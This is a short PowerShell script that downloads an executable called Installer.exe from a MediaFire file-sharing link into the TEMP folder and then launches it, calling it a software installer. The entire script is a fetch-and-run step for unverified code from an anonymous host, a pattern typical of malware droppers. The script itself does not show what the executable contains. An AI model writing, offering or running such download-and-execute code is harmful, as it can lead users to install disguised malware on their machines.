$url = "https://www.mediafire.com/file/fv85qk44ehjq6t6/Installer.exe/file"
$output = "$env:TEMP\installer.exe"

Write-Host "Downloading software installer..."
Invoke-WebRequest -Uri $url -OutFile $output

Write-Host "Starting installer (requires user confirmation)..."
Start-Process -FilePath $output -Wait
